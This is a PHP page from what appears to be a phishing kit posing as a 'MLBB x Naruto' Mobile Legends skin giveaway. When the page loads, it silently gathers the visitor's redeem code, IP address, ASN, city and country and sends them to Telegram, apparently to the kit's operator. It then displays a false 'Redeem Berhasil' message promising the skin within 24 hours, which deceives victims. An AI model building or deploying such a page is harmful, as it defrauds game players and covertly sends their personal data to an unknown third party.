<?php
include 'includes/config.php';
include 'includes/functions.php';

$code = $_GET['code'] ?? '';

// Ambil data pengguna untuk log
$ip = getUserIP();
$asn = getASN($ip);
$city = getCity($ip);
$country = getCountry($ip);

// Kirim data ke Telegram
sendToTelegram("Redeem Success - Code: $code | IP: $ip | Location: $city, $country");

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redeem Berhasil</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="container">
        <header>
            <img src="assets/images/logo.png" alt="MLBB x Naruto" class="logo">
            <h1>Redeem Berhasil!</h1>
        </header>
        
        <main>
            <div class="success-message">
                <h2>Selamat!</h2>
                <p>Kode redeem <strong><?php echo htmlspecialchars($code); ?></strong> berhasil digunakan.</p>
                <p>Skin Naruto akan segera masuk ke akun MLBB Anda dalam waktu 24 jam.</p>
                
                <div class="instructions">
                    <h3>Instruksi:</h3>
                    <ol>
                        <li>Buka game Mobile Legends</li>
                        <li>Masuk ke akun Anda</li>
                        <li>Periksa mailbox atau inventory</li>
                        <li>Skin akan tersedia dalam waktu 24 jam</li>
                    </ol>
                </div>
            </div>
            
            <a href="index.php" class="back-btn">Kembali ke Halaman Utama</a>
        </main>
        
        <footer>
            <p>© 2023 MLBB x Naruto Collaboration. Tidak berafiliasi dengan Moonton atau Shueisha.</p>
        </footer>
    </div>
</body>
</html>
